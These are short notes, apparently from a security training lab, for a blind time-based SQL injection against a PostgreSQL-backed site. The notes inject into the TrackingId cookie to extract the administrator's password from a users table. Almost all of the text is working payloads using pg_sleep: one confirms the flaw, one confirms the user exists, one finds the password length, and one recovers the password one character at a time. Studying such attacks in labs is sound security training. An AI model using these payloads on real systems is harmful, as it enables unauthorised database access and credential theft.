[INFO]
- Table  :: users
- Fields :: username, password
- User   :: administrator

[STEPS]
1 - Confirm that param is vulnerable to delay pg_sleep(5)

    param = TrackingId

    query = ZB51zWkVTjg0qPhc' || pg_sleep(5)--

2 - Confirm that user exist (administrator)

    ' || (SELECT CASE WHEN (username='administrator') THEN pg_sleep(5) ELSE pg_sleep(0) END FROM users)--

3 - Confirm the password lenght

    ' || (SELECT CASE WHEN (username='administrator' AND LENGTH(password)>5) THEN pg_sleep(5) ELSE pg_sleep(0) END FROM users)--

4 - Confirm the first char from password 

    ' || (SELECT CASE WHEN (username='administrator' AND SUBSTRING(password, <pos>, 1)='<char>') THEN pg_sleep(5) ELSE pg_sleep(0) END FROM users)--

5 - Confirm the full password using python script